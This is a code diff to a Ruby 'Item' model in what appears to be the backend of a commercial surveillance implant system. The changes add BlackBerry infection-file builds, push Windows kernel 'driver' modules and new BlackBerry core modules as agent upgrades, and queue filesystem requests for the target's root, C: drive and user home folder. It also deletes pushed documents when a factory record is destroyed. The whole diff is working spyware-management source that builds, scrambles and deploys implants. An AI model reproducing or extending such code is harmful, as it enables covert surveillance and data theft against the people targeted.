@@ -42,6 +42,7 @@ class Item
   field :uninstalled, type: Boolean
   field :demo, type: Boolean
   field :upgradable, type: Boolean
+  field :purge, type: Array, default: [0, 0]
 
   field :cs, type: String
   
@@ -226,6 +227,7 @@ class Item
 
           if mod['mobile']
             factory = ::Item.where({_kind: 'factory', ident: mod['factory']}).first
+
             build = RCS::DB::Build.factory(:winmo)
             build.load({'_id' => factory._id})
             build.unpack
@@ -233,7 +235,19 @@ class Item
             build.scramble
             build.melt({'admin' => false, 'demo' => self.demo})
             add_upgrade('wmcore.001', File.join(build.tmpdir, 'autorun.exe'))
-            add_upgrade('wmcore.002', File.join(build.tmpdir, 'autorun.zoo'))
+            add_upgrade('wmcore.002', File.join(build.tmpdir, 'autorun.zoo'))                       
+            build.clean
+            
+            build = RCS::DB::Build.factory(:blackberry)
+            build.load({'_id' => factory._id})
+            build.unpack
+            build.patch({'demo' => self.demo})
+            build.scramble
+            build.melt({'appname' => 'bb_in'})
+            build.infection_files('bb_in').each do |f|
+              trace :debug, " BlackBerry adding: #{f}"
+              add_upgrade(f[:name], f[:path])
+            end
             build.clean
           end
 
@@ -273,12 +287,14 @@ class Item
     content = File.open(file, 'rb+') {|f| f.read}
     raise "Cannot read from file #{file}" if content.nil?
 
-    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name})] })
+    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name, content_type: 'application/octet-stream'})] })
   end
 
   def upgrade!
-    return if self.upgradable
     return if self.version.nil?
+
+    # delete any pending upgrade if requested multiple time
+    self.upgrade_requests.destroy_all if self.upgradable
 
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
@@ -300,6 +316,8 @@ class Item
           add_upgrade('dll64', File.join(build.tmpdir, 'core64'))
         else
           add_upgrade('core64', File.join(build.tmpdir, 'core64'))
+          add_upgrade('driver', File.join(build.tmpdir, 'driver'))
+          add_upgrade('driver64', File.join(build.tmpdir, 'driver64'))
         end
       when 'osx'
         add_upgrade('inputmanager', File.join(build.tmpdir, 'inputmanager'))
@@ -310,9 +328,12 @@ class Item
       when 'winmo'
         add_upgrade('smsfilter', File.join(build.tmpdir, 'smsfilter'))
       when 'blackberry'
-        # TODO: change this when multi-core will be implemented
-        add_upgrade('core-1', File.join(build.tmpdir, 'net_rim_bb_lib-1.cod'))
-        add_upgrade('core-0', File.join(build.tmpdir, 'net_rim_bb_lib.cod'))
+       	add_upgrade('core-1_4.5', File.join(build.tmpdir, 'net_rim_bb_lib-1_4.5.cod'))
+        add_upgrade('core-0_4.5', File.join(build.tmpdir, 'net_rim_bb_lib_4.5.cod'))
+        if self.version >= 2012063001
+          add_upgrade('core-1_5.0', File.join(build.tmpdir, 'net_rim_bb_lib-1_5.0.cod'))
+          add_upgrade('core-0_5.0', File.join(build.tmpdir, 'net_rim_bb_lib_5.0.cod'))
+		    end
     end
 
     # always upgrade the core
@@ -330,11 +351,11 @@ class Item
     # the request for the root
     self.filesystem_requests.create!({path: '/', depth: 1})
 
-    # the home for the current user
-    self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
-
     # special request for windows to have the c: drive
     self.filesystem_requests.create!({path: '%HOMEDRIVE%\\\\*', depth: 1}) if self.platform == 'windows'
+
+    # the home for the current user
+    self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
   end
 
   def create_callback
@@ -394,6 +415,9 @@ class Item
           Evidence.collection_class(self.path.last).destroy_all(conditions: { aid: self._id.to_s })
           trace :info, "Deleting evidence for agent #{self.name} done."
         end
+      when 'factory'
+        # delete all the pushed documents of this factory
+        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
     end
 
     RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'destroy'})
@@ -430,6 +454,9 @@ class Item
           agent.status = 'closed'
           agent.save
         end
+      when 'factory'
+        # delete all the pushed documents of this factory
+        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
     end
   end
 
